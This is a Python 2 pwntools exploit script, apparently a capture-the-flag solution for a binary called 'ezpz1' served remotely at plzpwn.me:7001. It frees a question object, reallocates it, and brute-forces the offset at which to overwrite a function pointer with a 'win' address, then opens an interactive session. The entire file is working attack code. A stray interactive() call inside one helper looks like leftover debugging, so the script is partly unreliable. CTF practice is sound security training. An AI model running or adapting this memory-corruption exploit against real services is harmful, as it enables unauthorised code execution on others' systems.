#python2

import string
import json

from pwn import *

NAME = "./ezpz1"
context.binary = NAME

# https://stackoverflow.com/a/3368991
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""

def io_beg(): 
	return remote("plzpwn.me", 7001)
	#return process(NAME)

def header(s, len=20):
	print("="*len +s+"="*len)


def io_rdy(io):
	io.recvuntil("[Q]uit")
	print("Ready")

def io_q(io):
	io.sendline("q")
	
def io_c(io):
	io.sendline("c")
	io.recvuntil("Created new question. ID")
	buf = io.recvline().strip()
	io_rdy(io)
	return int(buf)
	
def io_d(io, id):
	io.sendline("d")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io_rdy(io)

def io_s(io, id, s):
	print("filling "+str(id)+" with "+s)
	io.sendline("S")
	io.recvuntil("Enter question id: ")
	io.sendline(str(id))
	io.recv(timeout=1)
	io.sendline(s)
	return 0

def io_a(io, id):
	io.sendline("a")
	io.recvuntil("Enter question id: ")
	io.interactive()
	io.sendline(str(id))
	
	try:
		io.recvuntil("I have the answer perhaps: '")
		buf = io.recvuntil("'")
		io_rdy(io)
		return buf
	except Exception, e:
		return 0

# inclusive
def io_all(io, min, max):
	buf = {}
	for i in range(max-min+1):
		k = i+min
		current = {str(k).zfill(3): io_a(io, k)}
		
		buf.update(current)
	
	j = json.dumps(buf, indent = 2, sort_keys=True)
	return j

def io_isCrash(io):
	buf = io.poll(False)
	
	if(buf == None):
		io_q(io)
		return 0
	elif(buf != 0):
		return 1
	else:
		return 0
	
maxlen = 23 #fgets, 24-\n = 23

# win	08048A5C	
win = 0x08048A5C
fin = 0
k = 0

while(not(fin)):
	io = io_beg()
	io_rdy(io)

	header("M1")
	io_c(io)
	io_s(io, 0, "B"*maxlen)
	io_d(io, 0)
	header("M2")
	buf = io_c(io)
	assert(buf == 1)
	
	var1 = k // maxlen
	var2 = k % maxlen
	
	assert(var1 <= maxlen)
	
	payload = "a"*var1+p32(win)+"b"*var2
	print("["+str(var1)+"]["+str(var2)+"]["+str(len(payload))+"]")
	
	io_s(io, 1, payload)
	
	try:
		io_a(io, 0)
	except Exception, e:
		pass
	
	if(io_isCrash(io)):
		k = k+1
		io.close()
	else:
		fin = 1

io.interactive()
